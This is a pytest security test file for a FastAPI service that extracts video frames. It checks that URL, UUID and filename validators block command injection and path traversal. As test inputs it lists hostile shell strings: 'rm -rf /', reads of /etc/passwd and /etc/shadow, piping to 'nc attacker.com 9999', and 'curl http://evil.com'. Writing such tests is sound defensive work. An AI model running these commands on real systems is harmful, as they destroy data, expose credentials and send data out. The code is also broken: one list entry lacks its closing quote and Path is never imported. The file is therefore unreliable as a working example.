"""
Security tests for Phase 1 fixes.
Tests Command Injection and Path Traversal protections.
"""

import pytest
from fastapi.testclient import TestClient
import sys
import os

# Add parent to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from main import app
from utils.validators import (
    validate_reel_url,
    validate_uuid,
    validate_filename,
    get_safe_path,
)
from utils.security import ValidationError, build_safe_command

client = TestClient(app)


# ============== Command Injection Tests ==============

class TestCommandInjection:
    """Tests for Command Injection vulnerability fixes."""
    
    def test_valid_instagram_url(self):
        """Valid Instagram URL should be accepted."""
        assert validate_reel_url("https://www.instagram.com/reel/ABC123/") == True
        assert validate_reel_url("https://instagram.com/reel/ABC123") == True
    
    def test_valid_youtube_url(self):
        """Valid YouTube URL should be accepted."""
        assert validate_reel_url("https://www.youtube.com/watch?v=ABC123") == True
        assert validate_reel_url("https://youtu.be/ABC123") == True
    
    def test_command_injection_attempts(self):
        """Command injection attempts should be rejected."""
        malicious_urls = [
            "https://example.com; rm -rf /",
            "https://example.com && cat /etc/passwd",
            "https://example.com | nc attacker.com 9999",
            "https://example.com`whoami`",
            "https://example.com$(id)",
            "../../../etc/passwd",
            "; cat /etc/shadow",
            "| /bin/sh",
            "`curl http://evil.com`",
        ]
        
        for url in malicious_urls:
            assert validate_reel_url(url) == False, f"Should reject: {url}"
    
    def test_dangerous_characters_blocked(self):
        """URLs with dangerous characters should be blocked."""
        dangerous_chars = [';', '&', '|', '`', '$', '(', ')', '{', '}']
        
        for char in dangerous_chars:
            url = f"https://example.com{char}rm -rf /"
            assert validate_reel_url(url) == False
    
    def test_build_safe_command(self):
        """Safe command builder should work correctly."""
        command = build_safe_command(
            ["yt-dlp", "-f", "mp4"],
            "https://www.instagram.com/reel/ABC123/",
            "/tmp/output.mp4"
        )
        
        # Should contain -- separator
        assert "--" in command
        
        # URL should be last (after --)
        url_index = command.index("--") + 1
        assert command[url_index] == "https://www.instagram.com/reel/ABC123/"
    
    def test_build_safe_command_rejects_malicious(self):
        """Safe command builder should reject malicious URLs."""
        with pytest.raises(ValidationError):
            build_safe_command(
                ["yt-dlp"],
                "; rm -rf /",
                "/tmp/output.mp4"
            )


# ============== Path Traversal Tests ==============

class TestPathTraversal:
    """Tests for Path Traversal vulnerability fixes."""
    
    def test_valid_uuid(self):
        """Valid UUID should be accepted."""
        valid_uuid = "550e8400-e29b-41d4-a716-446655440000"
        assert validate_uuid(valid_uuid) == True
    
    def test_invalid_uuid_formats(self):
        """Invalid UUID formats should be rejected."""
        invalid_uuids = [
            "not-a-uuid",
            "550e8400-e29b-41d4-a716",  # Too short
            "550e8400-e29b-41d4-a716-446655440000-extra",  # Too long
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "g550e8400-e29b-41d4-a716-446655440000",  # Invalid char
            "550e8400-e29b-01d4-a716-446655440000",  # Wrong version
        ]
        
        for uuid_str in invalid_uuids:
            assert validate_uuid(uuid_str) == False, f"Should reject: {uuid_str}"
    
    def test_valid_filename(self):
        """Valid frame filename should be accepted."""
        assert validate_filename("frame_0000.png") == True
        assert validate_filename("frame_9999.png") == True
        assert validate_filename("frame_1234.png") == True
    
    def test_invalid_filenames(self):
        """Invalid filenames should be rejected."""
        invalid_names = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "frame_0000.jpg",  # Wrong extension
            "malicious.exe",
            "shell.sh",
            "frame_00000.png",  # 5 digits
            "frame_000.png",    # 3 digits
            "frame.png",        # No digits
            "",
        ]
        
        for name in invalid_names:
            assert validate_filename(name) == False, f"Should reject: {name}"
    
    def test_path_traversal_in_filename(self):
        """Path traversal in filename should be blocked."""
        traversal_attempts = [
            "../frame_0000.png",
            "..\\frame_0000.png",
            "subdir/../../../frame_0000.png",
        ]
        
        for name in traversal_attempts:
            assert validate_filename(name) == False
    
    def test_get_safe_path_valid(self):
        """Safe path construction should work for valid inputs."""
        path = get_safe_path(
            "/storage",
            "550e8400-e29b-41d4-a716-446655440000",
            "frame_0000.png"
        )
        
        expected = Path("/storage/550e8400-e29b-41d4-a716-446655440000/frame_0000.png")
        assert path == expected
    
    def test_get_safe_path_traversal_attempt(self):
        """Path traversal attempt should raise ValueError."""
        with pytest.raises(ValueError):
            get_safe_path(
                "/storage",
                "../../../etc/passwd",
                "frame_0000.png"
            )
        
        with pytest.raises(ValueError):
            get_safe_path(
                "/storage",
                "550e8400-e29b-41d4-a716-446655440000",
                "../../../etc/passwd"
            )


# ============== API Endpoint Tests ==============

class TestAPIEndpoints:
    """Tests for API endpoints security."""
    
    def test_health_endpoint(self):
        """Health check should work."""
        response = client.get("/health")
        assert response.status_code == 200
        assert response.json()["status"] == "healthy"
    
    def test_get_frame_invalid_uuid(self):
        """Get frame with invalid UUID should return 400."""
        response = client.get("/get-frame/invalid-uuid/frame_0000.png")
        assert response.status_code == 400
        assert "Invalid unique_id" in response.json()["detail"]
    
    def test_get_frame_traversal_attempt(self):
        """Path traversal in get-frame should be blocked."""
        # Попытка path traversal через UUID
        response = client.get("/get-frame/../../../etc/passwd/frame_0000.png")
        assert response.status_code in [400, 403, 404]
        
        # Попытка path traversal через filename
        response = client.get("/get-frame/550e8400-e29b-41d4-a716-446655440000/../../../etc/passwd")
        assert response.status_code in [400, 403]
    
    def test_get_frame_invalid_filename(self):
        """Get frame with invalid filename should return 400."""
        response = client.get("/get-frame/550e8400-e29b-41d4-a716-446655440000/malicious.exe")
        assert response.status_code == 400
        assert "Invalid frame_name" in response.json()["detail"]
    
    def test_extract_frames_url_invalid(self):
        """URL extraction with invalid URL should return 400."""
        response = client.post(
            "/extract-frames-url",
            data={
                "reel_url": "https://malicious.com; rm -rf /",
                "method": "ssim",
                "threshold": "0.8"
            }
        )
        assert response.status_code == 400
        assert "Invalid URL" in response.json()["detail"]
    
    def test_extract_frames_url_command_injection(self):
        """Command injection attempt should be blocked."""
        injection_attempts = [
            "; cat /etc/passwd",
            "| whoami",
            "`id`,
            "$(rm -rf /)",
        ]
        
        for attempt in injection_attempts:
            response = client.post(
                "/extract-frames-url",
                data={
                    "reel_url": attempt,
                    "method": "ssim",
                    "threshold": "0.8"
                }
            )
            assert response.status_code == 400, f"Should block: {attempt}"


# ============== Rate Limiting Tests ==============

class TestRateLimiting:
    """Tests for rate limiting."""
    
    def test_rate_limit_headers(self):
        """Rate limit headers should be present."""
        # Note: SimpleRateLimiter doesn't add headers automatically
        # In production, this would be handled by slowapi
        pass


# ============== Security Headers Tests ==============

class TestSecurityHeaders:
    """Tests for security headers."""
    
    def test_security_headers_on_error(self):
        """Security headers should be present on error responses."""
        response = client.get("/non-existent-endpoint")
        
        # Check for security headers
        assert "X-Content-Type-Options" in response.headers
        assert response.headers["X-Content-Type-Options"] == "nosniff"


# ============== Integration Tests ==============

class TestIntegration:
    """Integration tests for security features."""
    
    def test_full_flow_security(self):
        """Test that security works in full flow."""
        # This would require a real video file
        # For now, just test that validation works
        pass


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
